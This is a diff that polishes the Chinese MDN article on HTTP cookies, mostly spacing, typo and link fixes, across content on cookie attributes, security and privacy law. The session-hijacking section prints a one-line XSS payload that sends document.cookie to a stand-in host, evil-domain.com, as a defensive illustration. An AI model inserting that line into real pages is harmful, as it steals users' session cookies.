@@ -1,5 +1,5 @@
 ---
-title: HTTP cookies
+title: HTTP Cookie
 slug: Web/HTTP/Cookies
 tags:
   - Cookies
@@ -8,7 +8,7 @@ translation_of: Web/HTTP/Cookies
 ---
 <div>{{HTTPSidebar}}</div>
 
-<p class="summary">HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于<a href="/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless">无状态</a>的HTTP协议记录稳定的状态信息成为了可能。</p>
+<p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于<a href="/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless">无状态</a>的 HTTP 协议记录稳定的状态信息成为了可能。</p>
 
 <p>Cookie 主要用于以下三个方面：</p>
 
@@ -18,21 +18,21 @@ translation_of: Web/HTTP/Cookies
  <li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
 </ul>
 
-<p>Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 <a href="/zh-CN/docs/Web/API/Web_Storage_API" title="DOM Storage">Web storage API</a> （本地存储和会话存储）或 <a href="/zh-CN/docs/Web/API/IndexedDB_API">IndexedDB</a> 。</p>
+<p>Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 <a href="/zh-CN/docs/Web/API/Web_Storage_API" title="DOM Storage">Web storage API</a> （本地存储和会话存储）或 <a href="/zh-CN/docs/Web/API/IndexedDB_API">IndexedDB</a> 。</p>
 
 <div class="note">
-<p>要查看Cookie存储（或网页上能够使用其他的存储方式），你可以在开发者工具中启用<strong>存储查看</strong>（<a href="/en-US/docs/Tools/Storage_Inspector">Storage Inspector</a> ）功能，并在存储树上选中<strong>Cookie</strong>。</p>
+<p>要查看 Cookie 存储（或网页上能够使用其他的存储方式），你可以在开发者工具中启用<strong>存储查看</strong>（<a href="/en-US/docs/Tools/Storage_Inspector">Storage Inspector</a> ）功能，并在存储树上选中<strong>Cookie</strong>。</p>
 </div>
 
-<h2 id="创建Cookie">创建Cookie</h2>
+<h2 id="创建Cookie">创建 Cookie</h2>
 
 <p>当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 {{HTTPHeader("Set-Cookie")}} 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过  {{HTTPHeader("Cookie")}} 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>
 
-<h3 id="Set-Cookie响应头部和Cookie请求头部"><code>Set-Cookie响应头部</code>和<code>Cookie请求头部</code></h3>
+<h3 id="Set-Cookie响应头部和Cookie请求头部"><code>Set-Cookie 响应头部</code>和<code>Cookie 请求头部</code></h3>
 
-<p>服务器使用 {{HTTPHeader("Set-Cookie")}} 响应头部向用户代理（一般是浏览器）发送 Cookie信息。一个简单的 Cookie 可能像这样：</p>
+<p>服务器使用 {{HTTPHeader("Set-Cookie")}} 响应头部向用户代理（一般是浏览器）发送 Cookie 信息。一个简单的 Cookie 可能像这样：</p>
 
-<pre class="syntaxbox notranslate">Set-Cookie: &lt;cookie名&gt;=&lt;cookie值&gt;</pre>
+<pre class="syntaxbox notranslate">Set-Cookie: &lt;cookie 名&gt;=&lt;cookie 值&gt;</pre>
 
 <p>服务器通过该头部告知客户端保存 Cookie 信息。</p>
 
@@ -43,14 +43,14 @@ Set-Cookie: tasty_cookie=strawberry
 
 [页面内容]</pre>
 
-<p id="The_client_sends_back_to_the_server_its_cookies_previously_stored">现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过 {{HTTPHeader("Cookie")}} 请求头部再发送给服务器。</p>
+<p>现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的 Cookie 信息通过 {{HTTPHeader("Cookie")}} 请求头部再发送给服务器。</p>
 
 <pre class="notranslate">GET /sample_page.html HTTP/1.1
 Host: www.example.org
 Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre>
 
 <div class="blockIndicator note">
-<p><strong>提示:</strong> 如何在以下几种服务端程序中设置 <code>Set-Cookie</code> 响应头信息 :</p>
+<p><strong>提示：</strong> 如何在以下几种服务端程序中设置 <code>Set-Cookie</code> 响应头信息 :</p>
 
 <ul>
  <li><a href="https://secure.php.net/manual/en/function.setcookie.php">PHP</a></li>
@@ -65,7 +65,7 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre>
 <p>Cookie 的生命周期可以通过两种方式定义：</p>
 
 <ul>
- <li>会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（<code>Expires</code>）或者有效期（<code>Max-Age</code>）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。</li>
+ <li>会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（<code>Expires</code>）或者有效期（<code>Max-Age</code>）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。</li>
  <li>持久性 Cookie 的生命周期取决于过期时间（<code>Expires</code>）或有效期（<code>Max-Age</code>）指定的一段时间。</li>
 </ul>
 
@@ -74,22 +74,22 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre>
 <pre class="notranslate">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</pre>
 
 <div class="note">
-<p><strong>提示：</strong>当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。</p>
+<p><strong>提示：</strong>当 Cookie 的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。</p>
 </div>
 
-<p>如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止<a href="https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation">会话固定攻击（session fixation attacks）</a>，在该攻击中第三方可以重用用户的会话。</p>
+<p>如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止<a href="/zh-CN/docs/Web/Security/Types_of_attacks#Session_fixation">会话固定攻击（session fixation attacks）</a>，在该攻击中第三方可以重用用户的会话。</p>
 
 <h3 id="限制访问_Cookie">限制访问 Cookie</h3>
 
 <p>有两种方法可以确保 <code>Cookie</code> 被安全发送，并且不会被意外的参与者或脚本访问：<code>Secure</code> 属性和<code>HttpOnly</code> 属性。</p>
 
-<p>标记为 <code>Secure</code> 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 {{Glossary("MitM", "man-in-the-middle")}} 攻击者的攻击。但即便设置了 <code>Secure</code> 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，<code>Secure</code> 标记也无法提供确实的安全保障, 例如，可以访问客户端硬盘的人可以读取它。</p>
+<p>标记为 <code>Secure</code> 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 {{Glossary("MitM", "man-in-the-middle")}} 攻击者的攻击。但即便设置了 <code>Secure</code> 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，<code>Secure</code> 标记也无法提供确实的安全保障，例如，可以访问客户端硬盘的人可以读取它。</p>
 
 <div class="blockIndicator note">
-<p>从 Chrome 52 和 Firefox 52 开始，不安全的站点（<code>http:</code>）无法使用Cookie的 <code>Secure</code> 标记。</p>
+<p>从 Chrome 52 和 Firefox 52 开始，不安全的站点（<code>http:</code>）无法使用 Cookie 的 <code>Secure</code> 标记。</p>
 </div>
 
-<p>JavaScript {{domxref("Document.cookie")}} API 无法访问带有 <code>HttpOnly</code> 属性的cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 <code>HttpOnly</code> 属性。此预防措施有助于缓解<a href="https://wiki.developer.mozilla.org/zh-CN/docs/Web/Security/Types_of_attacks#Cross-site_scripting_(XSS)">跨站点脚本（XSS）</a>攻击。</p>
+<p>JavaScript {{domxref("Document.cookie")}} API 无法访问带有 <code>HttpOnly</code> 属性的 cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 <code>HttpOnly</code> 属性。此预防措施有助于缓解<a href="/zh-CN/docs/Web/Security/Types_of_attacks#Cross-site_scripting_(XSS)">跨站点脚本（XSS）</a>攻击。</p>
 
 <p>示例：</p>
 
@@ -97,7 +97,7 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre>
 
 <h3 id="Cookie_的作用域">Cookie 的作用域</h3>
 
-<p><code>Domain</code> 和 <code>Path</code> 标识定义了Cookie的<em>作用域：</em>即允许 Cookie 应该发送给哪些URL。</p>
+<p><code>Domain</code> 和 <code>Path</code> 标识定义了 Cookie 的<em>作用域：</em>即允许 Cookie 应该发送给哪些 URL。</p>
 
 <h4 id="Domain_属性">Domain 属性</h4>
 
@@ -136,7 +136,7 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre>
 <ul>
  <li><code><strong>None</strong></code><strong>。</strong>浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写。</li>
  <li><strong><code>Strict</code>。</strong>浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）</li>
- <li><strong><code>Lax</code>。</strong>与 <strong><code>Strict</code> </strong>类似，但用户从外部站点导航至URL时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到URL时才会发送。如 link 链接</li>
+ <li><strong><code>Lax</code>。</strong>与 <strong><code>Strict</code> </strong>类似，但用户从外部站点导航至 URL 时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到 URL 时才会发送。如 link 链接</li>
 </ul>
 
 <div class="blockIndicator note">
@@ -147,9 +147,9 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre>
 
 <h4 id="Cookie_prefixes">Cookie prefixes</h4>
 
-<p>cookie 机制的使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。</p>
+<p>cookie 的机制使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。</p>
 
-<p>子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。有关主要缓解方法，请参阅<a href="https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation">会话劫持（ session fixation）</a>。</p>
+<p>子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。有关主要缓解方法，请参阅<a href="/zh-CN/docs/Web/Security/Types_of_attacks#Session_fixation">会话劫持（ session fixation）</a>。</p>
 
 <p>但是，作为<a href="https://en.wikipedia.org/wiki/Defense_in_depth_(computing)">深度防御措施</a>，可以使用 cookie 前缀来断言有关 cookie 的特定事实。有两个前缀可用：</p>
 
@@ -166,11 +166,11 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre>
 <p>在应用程序服务器上，Web 应用程序<strong>必须</strong>检查完整的 cookie 名称，包括前缀 —— 用户代理程序在从请求的 {{HTTPHeader("Cookie")}} 标头中发送前缀之前，<strong>不会</strong>从 cookie 中剥离前缀。</p>
 </div>
 
-<p>有关 cookie 前缀和浏览器支持的当前状态的更多信息，请参阅 <a href="https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Cookie_prefixes">Prefixes section of the Set-Cookie reference article</a>。</p>
+<p>有关 cookie 前缀和浏览器支持的当前状态的更多信息，请参阅 <a href="/zh-CN/docs/Web/HTTP/Headers/Set-Cookie#Cookie_prefixes">Prefixes section of the Set-Cookie reference article</a>。</p>
 
 <h4 id="JavaScript_通过_Document.cookie_访问_Cookie">JavaScript 通过 Document.cookie 访问 Cookie</h4>
 
-<p>通过 {{domxref("Document.cookie")}} 属性可创建新的 Cookie，也可通过该属性访问非<code>HttpOnly</code>标记的Cookie。</p>
+<p>通过 {{domxref("Document.cookie")}} 属性可创建新的 Cookie，也可通过该属性访问非<code>HttpOnly</code>标记的 Cookie。</p>
 
 <pre class="brush: js notranslate">document.cookie = "yummy_cookie=choco";
 document.cookie = "tasty_cookie=strawberry";
@@ -184,16 +184,16 @@ console.log(document.cookie);
 <h2 id="安全">安全</h2>
 
 <div class="note">
-<p>信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。</p>
+<p>信息被存在 Cookie 中时，需要明白 cookie 的值是可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。</p>
 
 <p>当机器处于不安全环境时，切记<em>不能</em>通过 HTTP Cookie 存储、传输敏感信息。</p>
 </div>
 
-<p>缓解涉及Cookie的攻击的方法：</p>
+<p>缓解涉及 Cookie 的攻击的方法：</p>
 
 <ul>
  <li>使用 <code>HttpOnly</code> 属性可防止通过 JavaScript 访问 cookie 值。</li>
- <li>用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 <code>SameSite</code> 属性设置为<code>Strict</code> 或 <code>Lax</code>。（请参见上方的 <a href="https://wiki.developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies$edit#">SameSite Cookie</a>。）在<a href="https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Browser_compatibility">支持 SameSite 的浏览器</a>中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。</li>
+ <li>用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 <code>SameSite</code> 属性设置为<code>Strict</code> 或 <code>Lax</code>。（请参见上方的 <a href="/zh-CN/docs/Web/HTTP/Cookies$edit#">SameSite Cookie</a>。）在<a href="/zh-CN/docs/Web/HTTP/Headers/Set-Cookie#Browser_compatibility">支持 SameSite 的浏览器</a>中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。</li>
 </ul>
 
 <h3 id="会话劫持和_XSS">会话劫持和 XSS</h3>
@@ -202,7 +202,7 @@ console.log(document.cookie);
 
 <pre class="brush: js notranslate">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;</pre>
 
-<p><code>HttpOnly</code> 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。</p>
+<p><code>HttpOnly</code> 类型的 Cookie 用于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。</p>
 
 <h3 id="跨站请求伪造（CSRF）">跨站请求伪造（CSRF）</h3>
 
@@ -223,9 +223,9 @@ console.log(document.cookie);
 
 <h3 id="第三方_Cookie">第三方 Cookie</h3>
 
-<p>Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为<em>第一方 cookie（ first-party cookie）</em>。如果域不同，则它是<em>第三方 cookie（third-party cookie）</em>。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，<a href="https://policies.google.com/technologies/types">types of cookies used by Google</a>。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。</p>
+<p>Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为<em>第一方 cookie（ first-party cookie）</em>。如果域不同，则它是<em>第三方 cookie（third-party cookie）</em>。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，<a href="https://policies.google.com/technologies/types">types of cookies used by Google</a>。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方 cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。</p>
 
-<p>如果你没有公开你网站上第三方 Cookie 的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对Cookie制订了相应的法规，可以查看维基百科上例子<a href="https://wikimediafoundation.org/wiki/Cookie_statement">cookie statement</a>。</p>
+<p>如果你没有公开你网站上第三方 Cookie 的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对 Cookie 制订了相应的法规，可以查看维基百科上例子<a href="https://wikimediafoundation.org/wiki/Cookie_statement">cookie statement</a>。</p>
 
 <h3 id="Cookie_相关规定">Cookie 相关规定</h3>
 
@@ -237,7 +237,7 @@ console.log(document.cookie);
  <li>加州消费者隐私法</li>
 </ul>
 
-<p>这些规定具有全球影响力，因为它们适用于这些司法管辖区（欧盟和加利福尼亚）的用户访问的万维网上的任何站点，但请注意，加利福尼亚州的法律仅适用于总收入超过2500万美元的实体其他事情。）</p>
+<p>这些规定具有全球影响力，因为它们适用于这些司法管辖区（欧盟和加利福尼亚）的用户访问的万维网上的任何站点，但请注意，加利福尼亚州的法律仅适用于总收入超过 2500 万美元的实体。）</p>
 
 <p>这些法规包括以下要求：</p>
 
@@ -247,34 +247,34 @@ console.log(document.cookie);
  <li>允许用户在不接收 Cookie 的情况下使用大部分服务。</li>
 </ul>
 
-<p>可能还存在其他法规来管理您当地的Cookie。您有责任了解并遵守这些规定。有些公司提供 "cookie banner" 代码，可帮助您遵守这些法规。</p>
+<p>可能还存在其他法规来管理您当地的 Cookie。您有责任了解并遵守这些规定。有些公司提供 "cookie banner" 代码，可帮助您遵守这些法规。</p>
 
 <p>可以通过<a href="https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive">维基百科的相关内容</a>获取最新的各国法律和更精确的信息。</p>
 
 <h4 id="禁止追踪_Do-Not-Track">禁止追踪 Do-Not-Track</h4>
 
-<p>虽然并没有法律或者技术手段强制要求使用 {{HTTPHeader("DNT")}}，但是通过{{HTTPHeader("DNT")}} 可以告诉Web程序不要对用户行为进行追踪或者跨站追踪。查看{{HTTPHeader("DNT")}} 以获取更多信息。</p>
+<p>虽然并没有法律或者技术手段强制要求使用 {{HTTPHeader("DNT")}}，但是通过{{HTTPHeader("DNT")}} 可以告诉 Web 程序不要对用户行为进行追踪或者跨站追踪。查看{{HTTPHeader("DNT")}} 以获取更多信息。</p>
 
 <h4 id="欧盟_Cookie_指令">欧盟 Cookie 指令</h4>
 
-<p>关于 Cookie，欧盟已经在<a href="http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136">2009/136/EC指令</a>中提了相关要求，该指令已于2011年5月25日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。</p>
+<p>关于 Cookie，欧盟已经在<a href="http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136">2009/136/EC 指令</a>中提了相关要求，该指令已于 2011 年 5 月 25 日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。</p>
 
 <p>该欧盟指令的大意：在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自从那以后，很多网站都在网站声明中添加了相关说明，告诉用户他们的 Cookie 将用于何处。</p>
 
 <h3 id="僵尸_Cookie_和删不掉的_Cookie">僵尸 Cookie 和删不掉的 Cookie</h3>
 
-<p>Cookie的一个极端使用例子是僵尸Cookie（或称之为“删不掉的Cookie”），这类 Cookie 较难以删除，甚至删除之后会自动重建。这些技术违反了用户隐私和用户控制的原则，可能违反了数据隐私法规，并可能使使用它们的网站承担法律责任。它们一般是使用 <a href="/en-US/docs/Web/API/Web_Storage_API" title="DOM Storage">Web storage API</a>、Flash本地共享对象或者其他技术手段来达到的。相关内容可以看：</p>
+<p>Cookie 的一个极端使用例子是僵尸 Cookie（或称之为“删不掉的 Cookie”），这类 Cookie 较难以删除，甚至删除之后会自动重建。这些技术违反了用户隐私和用户控制的原则，可能违反了数据隐私法规，并可能使使用它们的网站承担法律责任。它们一般是使用 <a href="/en-US/docs/Web/API/Web_Storage_API" title="DOM Storage">Web storage API</a>、Flash 本地共享对象或者其他技术手段来达到的。相关内容可以看：</p>
 
 <ul>
  <li><a href="https://github.com/samyk/evercookie">Evercookie by Samy Kamkar</a></li>
- <li><a href="https://en.wikipedia.org/wiki/Zombie_cookie">在维基百科上查看僵尸Cookie</a></li>
+ <li><a href="https://en.wikipedia.org/wiki/Zombie_cookie">在维基百科上查看僵尸 Cookie</a></li>
 </ul>
 
 <h2 id="在浏览器中存储信息的其他方式">在浏览器中存储信息的其他方式</h2>
 
-<p>在浏览器中存储数据的另一种方法是 <a href="https://wiki.developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API">Web Storage API</a>。<a href="https://wiki.developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage">window.sessionStorage</a> 和<a href="https://wiki.developer.mozilla.org/en-US/docs/Web/API/Window/localStorage">window.localStorage</a> 属性与持续时间中的会话和永久 cookie 相对应，但是存储限制比 cookie大，并且永远不会发送到服务器。</p>
+<p>在浏览器中存储数据的另一种方法是 <a href="/zh-CN/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API">Web Storage API</a>。<a href="/zh-CN/docs/Web/API/Window/sessionStorage">window.sessionStorage</a> 和<a href="/zh-CN/docs/Web/API/Window/localStorage">window.localStorage</a> 属性与持续时间中的会话和永久 cookie 相对应，但是存储限制比 cookie 大，并且永远不会发送到服务器。</p>
 
-<p>可以使用 <a href="https://wiki.developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API">IndexedDB API</a> 或基于它构建的库来存储更多结构化的数据。</p>
+<p>可以使用 <a href="/zh-CN/docs/Web/API/IndexedDB_API">IndexedDB API</a> 或基于它构建的库来存储更多结构化的数据。</p>
 
 <h2 id="了解更多">了解更多</h2>
 
